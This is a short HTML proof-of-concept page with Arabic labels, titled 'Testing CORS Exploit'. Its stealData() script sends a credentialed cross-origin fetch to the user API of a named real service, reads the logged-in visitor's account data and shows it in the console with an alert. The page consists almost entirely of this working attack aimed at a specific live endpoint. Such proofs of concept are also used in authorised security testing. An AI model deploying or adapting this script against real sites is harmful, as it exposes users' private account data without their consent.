<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Testing CORS Exploit</title>
</head>
<body>
    <h1>اختبار استغلال CORS</h1>
    <button onclick="stealData()">جلب البيانات</button>
    
    <script>
        function stealData() {
            fetch("https://we.toloka.ai/api/v1/user", {
                credentials: "include"
            })
            .then(response => response.text())
            .then(data => {
                console.log("بيانات المستخدم:", data);
                alert("تم استرجاع البيانات! تحقق من Console");
            })
            .catch(error => console.error("فشل الهجوم:", error));
        }
    </script>
</body>
</html>
